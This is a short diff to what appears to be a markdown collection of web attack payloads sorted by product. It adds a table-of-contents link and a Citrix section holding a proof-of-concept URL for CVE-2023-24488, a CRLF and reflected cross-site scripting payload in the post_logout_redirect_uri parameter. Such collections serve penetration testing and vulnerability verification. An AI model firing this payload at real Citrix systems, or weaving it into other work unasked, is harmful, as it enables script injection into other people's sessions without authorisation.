@@ -58,6 +58,7 @@
 - [Spring Boot](#spring-boot)
 - [Apache](#apache)
 - [Cisco](#cisco)
+- [Citrix](#citrix)
 
 
 ## SQL Injection
@@ -1742,3 +1743,9 @@ Accept: */*
 </html>
 ```
  
+## Citrix
+
+**CVE-2023-24488**
+```
+https://domain/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>
+```
